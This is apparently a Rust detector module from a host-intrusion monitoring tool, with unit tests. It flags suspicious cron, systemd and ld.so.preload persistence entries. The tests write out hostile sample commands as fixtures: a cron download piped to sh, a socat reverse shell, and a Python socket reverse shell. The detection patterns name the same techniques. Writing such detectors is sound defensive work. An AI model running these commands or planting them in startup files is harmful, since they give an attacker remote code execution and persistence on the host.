use crate::detectors::command_profile::assess_network_execution_command;
use crate::detectors::risk::RiskAssessment;
use crate::detectors::{
    evidence, package_activity_context, push_event_evidence_if_present, string_field,
    DetectContext, Detector, PackageActivityContext, RESOURCE_DRIFT_DEDUP_KEYS,
};
use crate::rules::model::RuleMetadata;
use sentinel_core::{Category, Finding, RawEvent, Severity};

pub struct PersistenceDetector;

impl Detector for PersistenceDetector {
    fn name(&self) -> &'static str {
        "persistence_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "PERSIST-001",
                "New or changed persistence entry",
                Category::Persistence,
                Severity::High,
                "A startup-related file changed relative to the baseline.",
            ),
            RuleMetadata::new(
                "PERSIST-002",
                "Suspicious cron or startup command",
                Category::Persistence,
                Severity::High,
                "A persistence command reached the suspicious risk score threshold.",
            ),
            RuleMetadata::new(
                "PERSIST-003",
                "ld.so.preload modified",
                Category::Persistence,
                Severity::High,
                "Dynamic linker preload configuration changed or contains entries.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        let package_context = package_activity_context(events);
        for event in events {
            let path = string_field(event, "path");
            if !path.is_empty() && ctx.file_path_allowlist.matches(&path) {
                continue;
            }
            match event.kind.as_str() {
                "persistence_created" | "persistence_modified" => {
                    if event.field("type") == Some("ld_preload") {
                        findings.push(ld_preload_changed(event, ctx, &package_context));
                    } else {
                        findings.push(persistence_changed(event, ctx, &package_context));
                    }
                }
                "persistence_entry" => {
                    let assessment = assess_persistence_entry(event);
                    if assessment.is_suspicious(ctx.config.persistence.suspicious_command_min_score)
                    {
                        findings.push(suspicious_entry(event, ctx, assessment));
                    }
                }
                _ => {}
            }
        }
        findings
    }
}

fn persistence_changed(
    event: &RawEvent,
    ctx: &DetectContext,
    package_context: &PackageActivityContext,
) -> Finding {
    let path = string_field(event, "path");
    let mut finding = Finding::new(
        &ctx.host_id,
        "Persistence-related file changed",
        "A cron, systemd, or shell startup file changed compared with the baseline.",
        Severity::High,
        Category::Persistence,
        "PERSIST-001",
        &path,
    )
    .with_evidence_deduped_by(
        {
            let mut items = diff_evidence(event);
            items.extend(package_context.evidence());
            items
        },
        RESOURCE_DRIFT_DEDUP_KEYS,
    )
    .with_recommendations(vec![
        "Inspect the startup entry and verify it was added by an administrator or package update."
            .to_string(),
        "Check whether the referenced executable lives in temporary or web-writable paths."
            .to_string(),
    ]);
    if let Some(recommendation) = package_context.recommendation() {
        finding.recommendations.push(recommendation);
    }
    finding
}

fn suspicious_entry(event: &RawEvent, ctx: &DetectContext, assessment: RiskAssessment) -> Finding {
    let path = string_field(event, "path");
    Finding::new(
        &ctx.host_id,
        "Suspicious startup command detected",
        "A startup-related file contains a command whose risk score reached the suspicious threshold.",
        Severity::High,
        Category::Persistence,
        "PERSIST-002",
        &path,
    )
    .with_evidence(vec![
        evidence("path", path),
        evidence("type", string_field(event, "type")),
        evidence("suspicious_lines", string_field(event, "suspicious_lines")),
        evidence("risk_score", assessment.score.to_string()),
        evidence("risk_reasons", assessment.reason_text()),
        evidence("risk_features", assessment.feature_names()),
    ])
    .with_impact(vec![
        "The host may run attacker-controlled code automatically after reboot or login."
            .to_string(),
    ])
    .with_recommendations(vec![
        "Review the command target and network destination.".to_string(),
        "Preserve the file before removing unknown startup entries.".to_string(),
    ])
}

fn assess_persistence_entry(event: &RawEvent) -> RiskAssessment {
    let mut assessment = RiskAssessment::default();
    for line in string_field(event, "suspicious_lines").lines() {
        absorb_persistence_line(&mut assessment, line);
    }
    assessment
}

fn absorb_persistence_line(assessment: &mut RiskAssessment, line: &str) {
    assessment.merge_max(assess_persistence_line(line));
}

fn assess_persistence_line(line: &str) -> RiskAssessment {
    let command = persistence_command_text(line);
    let lowered = command.to_ascii_lowercase();
    let mut assessment = RiskAssessment::default();

    let network_assessment = assess_network_execution_command(command);
    if network_assessment.is_suspicious() {
        assessment.add_signal(
            90,
            "network_execution_bridge",
            network_assessment.reason_text(),
        );
    }

    if contains_temp_payload_path(&lowered) {
        assessment.add_signal(
            80,
            "temporary_path",
            "startup command references a temporary executable path",
        );
    }

    let downloader = contains_command_word(&lowered, &["curl", "wget"]);
    let pipe_to_shell = contains_pipe_to_shell(&lowered);
    if downloader && pipe_to_shell {
        assessment.add_signal(
            85,
            "download_to_shell",
            "startup command downloads data and pipes it to a shell",
        );
    }

    if contains_base64_decode(&lowered) && (pipe_to_shell || lowered.contains("eval")) {
        assessment.add_signal(
            80,
            "encoded_shell_payload",
            "startup command decodes payload data before shell execution",
        );
    }

    if is_shell_wrapper_only(&lowered) {
        assessment.add_feature("shell_wrapper");
    }

    assessment
}

fn persistence_command_text(line: &str) -> &str {
    let trimmed = line.trim();
    let Some((key, value)) = trimmed.split_once('=') else {
        return trimmed;
    };
    let key = key.trim().to_ascii_lowercase();
    if key.starts_with("exec") {
        value.trim()
    } else {
        trimmed
    }
}

fn contains_temp_payload_path(line: &str) -> bool {
    ["/tmp/", "/var/tmp/", "/dev/shm/"]
        .iter()
        .any(|marker| line.contains(marker))
}

fn contains_command_word(line: &str, commands: &[&str]) -> bool {
    line.split(|ch: char| !(ch.is_ascii_alphanumeric() || matches!(ch, '_' | '-' | '/' | '.')))
        .filter_map(|token| token.rsplit('/').next())
        .any(|name| commands.contains(&name))
}

fn contains_pipe_to_shell(line: &str) -> bool {
    ["| sh", "|sh", "| bash", "|bash", "| /bin/sh", "| /bin/bash"]
        .iter()
        .any(|marker| line.contains(marker))
}

fn contains_base64_decode(line: &str) -> bool {
    line.contains("base64") && (line.contains(" -d") || line.contains("--decode"))
}

fn is_shell_wrapper_only(line: &str) -> bool {
    (line.contains("bash -c") || line.contains("sh -c"))
        && !contains_temp_payload_path(line)
        && !contains_pipe_to_shell(line)
        && !contains_base64_decode(line)
}

fn ld_preload_changed(
    event: &RawEvent,
    ctx: &DetectContext,
    package_context: &PackageActivityContext,
) -> Finding {
    let path = string_field(event, "path");
    let mut finding = Finding::new(
        &ctx.host_id,
        "ld.so.preload changed",
        "Dynamic linker preload configuration changed relative to the baseline.",
        Severity::High,
        Category::Persistence,
        "PERSIST-003",
        &path,
    )
    .with_evidence_deduped_by(
        {
            let mut items = diff_evidence(event);
            items.extend(package_context.evidence());
            items
        },
        RESOURCE_DRIFT_DEDUP_KEYS,
    )
    .with_recommendations(vec![
        "Inspect preload entries and verify every referenced library.".to_string(),
        "Treat unknown entries as a possible rootkit signal, not a confirmed rootkit by itself."
            .to_string(),
    ]);
    if let Some(recommendation) = package_context.recommendation() {
        finding.recommendations.push(recommendation);
    }
    finding
}

fn diff_evidence(event: &RawEvent) -> Vec<sentinel_core::Evidence> {
    let mut items = vec![
        evidence("change", event.kind.clone()),
        evidence("type", string_field(event, "type")),
        evidence("path", string_field(event, "path")),
        evidence("previous_hash", string_field(event, "previous_hash")),
        evidence("current_hash", string_field(event, "current_hash")),
    ];
    for key in [
        "semantic_kind",
        "semantic_delta",
        "previous_semantic_summary",
        "current_semantic_summary",
        "current_semantic_features",
    ] {
        push_event_evidence_if_present(&mut items, event, key);
    }
    items
}

#[cfg(test)]
mod tests {
    use super::{assess_persistence_line, PersistenceDetector};
    use crate::detectors::{DetectContext, Detector};
    use sentinel_core::{RawEvent, SentinelConfig};
    use std::sync::Arc;

    #[test]
    fn persistence_risk_model_ignores_plain_shell_wrappers() {
        let assessment =
            assess_persistence_line("ExecStart=/bin/bash -c 'read args <&3; echo args=$args'");
        assert!(!assessment.is_suspicious(70));
        assert!(assessment.has_feature("shell_wrapper"));
    }

    #[test]
    fn persistence_risk_model_detects_download_to_shell() {
        let assessment = assess_persistence_line("* * * * * curl http://203.0.113.10/x | sh");
        assert!(assessment.is_suspicious(70));
        assert!(assessment.has_feature("download_to_shell"));
    }

    #[test]
    fn persistence_risk_model_detects_temp_autostart_payload() {
        let assessment = assess_persistence_line("@reboot /dev/shm/.x");
        assert!(assessment.is_suspicious(70));
        assert!(assessment.has_feature("temporary_path"));
    }

    #[test]
    fn persistence_risk_model_uses_network_execution_profile() {
        let assessment =
            assess_persistence_line("ExecStart=socat TCP:203.0.113.10:4444 EXEC:/bin/sh,pty");
        assert!(assessment.is_suspicious(70));
        assert!(assessment.has_feature("network_execution_bridge"));
    }

    #[test]
    fn persistence_risk_model_parses_systemd_exec_prefix() {
        let assessment = assess_persistence_line(
            "ExecStart=python3 -c 'import socket,os; s=socket.socket(); os.dup2(s.fileno(),0); os.system(\"/bin/sh\")'",
        );
        assert!(assessment.is_suspicious(70));
        assert!(assessment.has_feature("network_execution_bridge"));
    }

    #[test]
    fn detector_ignores_cloud_init_hotplug_shell_wrapper() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("persistence", "persistence_entry")
            .with_field(
                "path",
                "/usr/lib/systemd/system/cloud-init-hotplugd.service",
            )
            .with_field("type", "systemd")
            .with_field(
                "suspicious_lines",
                "ExecStart=/bin/bash -c 'read args <&3; echo \"args=$args\"; \\'",
            );

        let findings = PersistenceDetector.detect(&[event], &ctx);

        assert!(findings.is_empty());
    }

    #[test]
    fn persistence_drift_includes_package_activity_context() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let drift = RawEvent::new("baseline", "persistence_modified")
            .with_field("path", "/lib/systemd/system/nginx.service")
            .with_field("type", "systemd")
            .with_field("previous_hash", "old")
            .with_field("current_hash", "new");
        let with_package_context = vec![
            RawEvent::new("package_manager", "package_manager_activity")
                .with_field("path", "/var/log/apt/history.log"),
            drift.clone(),
        ];

        let with_context = PersistenceDetector.detect(&with_package_context, &ctx);
        let without_context = PersistenceDetector.detect(&[drift], &ctx);

        assert_eq!(with_context.len(), 1);
        assert_eq!(without_context.len(), 1);
        assert_eq!(with_context[0].dedup_key, without_context[0].dedup_key);
        assert!(with_context[0]
            .evidence
            .iter()
            .any(|item| item.key == "package_activity_recent" && item.value == "true"));
    }

    #[test]
    fn persistence_drift_respects_file_path_glob_allowlist() {
        let mut config = SentinelConfig::default();
        config
            .allowlist
            .file_paths
            .push("/etc/systemd/system/snap-*.mount".into());
        let ctx = DetectContext::new(Arc::new(config));
        let drift = RawEvent::new("baseline", "persistence_modified")
            .with_field("path", "/etc/systemd/system/snap-core20-2890.mount")
            .with_field("type", "systemd")
            .with_field("previous_hash", "old")
            .with_field("current_hash", "new");

        let findings = PersistenceDetector.detect(&[drift], &ctx);

        assert!(findings.is_empty());
    }

    #[test]
    fn persistence_drift_includes_semantic_delta() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("baseline", "persistence_modified")
            .with_field("path", "/etc/systemd/system/app.service")
            .with_field("type", "systemd")
            .with_field("previous_hash", "old")
            .with_field("current_hash", "new")
            .with_field("semantic_kind", "systemd_unit")
            .with_field("semantic_delta", "systemd_unit: commands=1 -> commands=2")
            .with_field("current_semantic_features", "network_or_shell_command");

        let findings = PersistenceDetector.detect(&[event], &ctx);

        assert_eq!(findings.len(), 1);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "semantic_delta"));
    }
}
